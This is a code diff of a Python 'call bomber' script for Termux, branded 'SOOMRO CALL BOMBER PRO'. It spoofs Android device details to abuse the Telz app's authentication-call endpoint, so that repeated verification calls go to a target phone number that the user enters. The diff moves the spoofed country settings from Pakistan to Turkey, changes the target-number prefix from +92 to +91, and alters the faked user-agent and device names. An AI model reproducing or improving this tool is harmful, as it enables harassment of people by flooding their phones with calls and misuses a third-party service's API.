@@ -1,7 +1,7 @@
-#!/usr/init/env python3
+#!/usr/bin/env python3
 """
 ====================================================================
-                🔥 SOOMRO CALL BOMBER PRO v3.1 🔥
+                🔥 SOOMRO CALL BOMBER PRO v3.2 🔥
                   Developer: SOOMRO 
             Ultimate Termux CLI Edition (Fully Branded)
 ====================================================================
@@ -15,8 +15,8 @@ import sys
 import os
 
 # ========== YOUR CUSTOM BRANDING & CONTACTS ==========
-WHATSAPP_NUM = "+923XXXXXXXXX"  
-COMMUNITY_LINK = "https://chat.whatsapp.com/YourCommunityLink"  
+WHATSAPP_NUM = "+923XXXXXXXXX"  # Apna WhatsApp number yahan likhein
+COMMUNITY_LINK = "https://chat.whatsapp.com/YourCommunityLink"  # Apni community ka link yahan daalein
 # ======================================================
 
 R = "\033[1;31m"   
@@ -48,10 +48,11 @@ def print_banner():
 {C} 🌐 [COMMUNITY]  : {W}{COMMUNITY_LINK}
 {R}────────────────────────────────────────────────────────────{RES}\n""")
 
+# ========== TELZ CLIENT (Extracted from working bot logic) ==========
 class TelzClient:
     base_url = "https://api.telz.com/"
     headers = {
-        'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001)",
+        'User-Agent': "Telz-Android/17.5.33",
         'Accept-Encoding': "gzip",
         'Content-Type': "application/json; charset=UTF-8",
         'Connection': "close"
@@ -61,13 +62,13 @@ class TelzClient:
         self.android_id = uuid.uuid4().hex[:16]
         self.app_version = "17.5.33"
         self.os_type = "android"
-        self.os_version = "13"
+        self.os_version = "15"
         self.uuid = str(uuid.uuid4())
         self.session = requests.Session()
     
     @staticmethod
     def random_device_name():
-        devices = ["Pixel-Pro-9", "Xiaomi-14-Ultra", "Samsung-S24", "OnePlus-12"]
+        devices = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto"]
         return f"{devices[int(uuid.uuid4().int % len(devices))]}-{uuid.uuid4().hex[:6]}"
     
     def _post(self, endpoint, data, timeout=15.0):
@@ -82,7 +83,7 @@ class TelzClient:
         })
         response = self.session.post(url, data=json.dumps(data), headers=self.headers, timeout=timeout)
         if response.status_code == 429:
-            raise RuntimeError("Rate limit hit (Too fast)")
+            raise RuntimeError("Rate limit hit")
         response.raise_for_status()
         try:
             return response.json()
@@ -103,16 +104,16 @@ class TelzClient:
             "ipv4_address": "10.1.10.1",
             "ipv6_address": "FE80::1",
             "lang": "en",
-            "network_country": "pk",
+            "network_country": "tr",
             "network_type": "4G",
             "roaming": "no",
             "root": "no",
             "run_id": "",
-            "sim_country": "pk"
+            "sim_country": "tr"
         })
     
     def validate_phonenumber(self, phone):
-        return self._post("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": phone, "region": "PK"})
+        return self._post("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": phone, "region": "TR"})
     
     def auth_call(self, phone):
         return self._post("app/auth_call", {"event": "auth_call", "phone": phone, "attempt": "0", "lang": "en"})
@@ -120,12 +121,12 @@ class TelzClient:
 def main():
     print_banner()
     
-    phone_input = input(f"{Y} ➔ Enter Target Phone Number {D}(e.g. 3001234567): {W}").strip()
+    phone_input = input(f"{Y} ➔ Enter Target Phone Number {D}(e.g. 9876543210): {W}").strip()
     
-    if len(phone_input) == 10 and not phone_input.startswith("0"):
-        phone = "+92" + phone_input
-    elif phone_input.startswith("0"):
-        phone = "+92" + phone_input[1:]
+    if len(phone_input) == 10:
+        phone = "+91" + phone_input
+    elif len(phone_input) == 12 and phone_input.startswith("91"):
+        phone = "+" + phone_input
     elif not phone_input.startswith("+"):
         phone = "+" + phone_input
     else:
